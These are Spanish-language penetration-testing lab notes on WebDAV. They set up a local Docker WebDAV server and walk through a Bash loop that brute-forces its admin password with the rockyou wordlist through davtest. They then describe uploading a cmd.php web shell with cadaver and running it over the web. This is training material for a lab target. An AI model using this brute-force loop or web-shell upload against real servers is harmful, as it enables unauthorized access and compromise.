----
- Tags: #servidores #webdav
---
# Definición

> **WebDAV** (**Web Distributed Authoring and Versioning**) es una extensión del protocolo **HTTP** que permite a los usuarios **acceder** y **manipular** archivos en un servidor web de forma segura. La enumeración de un servidor WebDAV se refiere al proceso de recolectar información sobre los recursos disponibles en el servidor, lo cual puede ser utilizado por atacantes para planificar ataques más avanzados.

Durante la enumeración, los atacantes buscan identificar las **extensiones de archivo permitidas en el servidor** para cargar y ejecutar archivos maliciosos. Si estos archivos son ejecutados con éxito, pueden comprometer la seguridad del sistema.

Entre las herramientas utilizadas para realizar pruebas de penetración en servidores WebDAV se encuentran **Davtest** y **Cadaver**. 

- ``davtest`` permite enumerar recursos protegidos, probar la configuración de seguridad y **detectar vulnerabilidades**. 
- ``cadaver`` permite navegar por los recursos del servidor, **cargar** y **descargar** archivos, y también realizar pruebas de penetración.

Para prevenir estos ataques, es crucial que los administradores de sistemas implementen medidas de seguridad, como limitar los recursos disponibles y utilizar autenticación y **autorización robustas**. Además, es fundamental que los usuarios protejan sus contraseñas y eviten usar contraseñas débiles.

-----
# Explotación de WebDAV en Laboratorio

Construiremos la imagen con el siguiente [contenedor](https://hub.docker.com/r/bytemark/webdav) de la web.

En la segunda línea de comandos en el parámetro ``PASSWORD=`` especificaremos las credenciales de nuestro usuario, por lo tanto colocaremos una contraseña que esté almacenada en el diccionario de */usr/share/wordlists/rockyou.txt*

- ``docker pull bytemark/webdav``
- ``docker run --restart always -v /srv/dav:/var/lib/dav -e AUTH_TYPE=Digest -e USERNAME=admin -e PASSWORD=patrick --publish 80:80 -d bytemark/webdav``

Si ahora vamos a http://localhost:80 veremos que al intentar ingresar a la web nos pide que nos autentiquemos.

![[webdav 1.png]]

Si nosotros por ejemplo no supiéramos las credenciales lo que deberíamos hacer es emplear **reconocimiento**, por ejemplo empleando la herramienta ``whatweb``.

![[webdav 2.png]]

De esta forma nos daríamos cuenta que esto se trata de un **WebDAV**.

---

Cuando disponemos de un caso como el anterior es cuando entra en juego la herramienta **Davtest** que ya suele venir instalada en la distribución de *Kali/Parrot* que es mi caso. 
Cuando nosotros utilizamos esta herramienta y dispongamos de **credenciales válidas** y las proporcionemos junto con el **URL de la web víctima** podemos realizar una **subida de múltiples archivos** con extensiones varias (*php*, *jsp*, *asp*, *aspx*, etc), esto lo que hará es indicarnos en base a ese pequeño chequeo que hace que archivos son **ejecutables** o **interpretados** por el servidor para ver si podemos ejecutar comandos o lo que deseemos. Todo esto se realiza porque **no siempre vamos a poder subir todos los archivos que deseemos** a un servidor que contenga **WebDAV**.

- ``davtest -url http://localhost:80 -auth admin:password-here``

Supongamos que no sabemos las credenciales del usuario "*admin*", podemos realizar un bucle ``while`` con **Bash Scripting** para iterar por cada linea del diccionario *rockyou.txt*.

----

Primero convertiremos el **STDERR** en **STDOUT** con ``2>&1`` para poder filtrar con la herramienta ``grep`` por la palabra **SUCCEED** que es la que suele aparecer cuando un archivo **es subido con éxito al servidor una vez proporcionemos credenciales válidas**.

- ``davtest -url http://localhost:80 -auth user:password 2>&1``

Ahora lo que haremos será añadir un ``cat`` a la ruta del diccionario *rockyou.txt* y con una **pipe** ``|`` concatenar un bucle ``while`` que itere por cada línea del diccionario en donde le especifiquemos, en este caso en el campo de ``password`` con ``$password`` para ahí colocar la respuesta de cada linea del diccionario.

- ``cat /usr/share/wordlists/rockyou.txt | while read password; do davtest -url http://localhost:80 -auth admin:$password; done``

Esto lo que hará será **almacenar cada linea del diccionario** en la variable llamada ``password`` que hemos creado con el ``while``

Ahora **almacenaremos la respuesta** del comando ``davtest`` en una variable llamada ``response`` para luego aplicar un condicional ``if []; then; fi;``, luego aplicaremos en esta misma variable un ``| grep -i succeed`` para cuando la respuesta contenga la cadena "**SUCCEED**" sea la única que nos muestre ==-i con la herramienta grep hace alusión a Case in Sensitive, es decir detecta mayúsculas y minúsculas por igual.==.

- ``cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://localhost:80 -auth admin:$password 2>&1 | grep -i "succeed""); if []; then; fi; done``

Ahora dentro del condicional agregaremos la condición que necesitamos, es decir que si la variable ``response`` posee contenido ``if [ $response ], then; fi;``

- ``cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://localhost:80 -auth admin:$password 2>&1 | grep -i "succeed"); if [ $response ]; then; fi; done``

Por ultimo solo quedaría agregar un ``echo`` para que nos avise cuando exista la coincidencia de que en la variable ``response``, se detecte la palabra ``succeed``, luego un ``break`` para que cuando encuentre la primer coincidencia termine con el bucle.

- ``cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://localhost:80 -auth admin:$password 2>&1 | grep -i "succeed"); if [ $response ]; then echo "[+] La contraseña correcta es $password"; break; fi; done``

![[webdav 3.png]]

----

La otra herramienta llamada **Cadaver** ``apt install cadaver`` se utiliza luego de encontrar las **credenciales válidas**, ya que al utilizarla nos pedirá las mismas.

![[webdav 4.png]]

De esta forma ingresaríamos al **WebDAV** con una consola más amigable con la que tendremos comandos similares a nuestra Shell de Linux, los mismos los podremos ver con el comando ``help`` una vez ingresemos al servidor.

![[webdav 5.png]]

De esta forma por ejemplo si **deseáramos subir un archivo malicioso** con extensión **PHP**, que imaginemos vimos con la herramienta **Davtest** que estos son interpretados, podríamos estando en el mismo directorio en nuestra máquina de atacante donde poseemos nuestro *cmd.php* ingresar al servidor **WebDAV** y hacer un ``put cmd.php`` para subir el archivo malicioso para luego **interpretarlo vía web** con http://localhost:80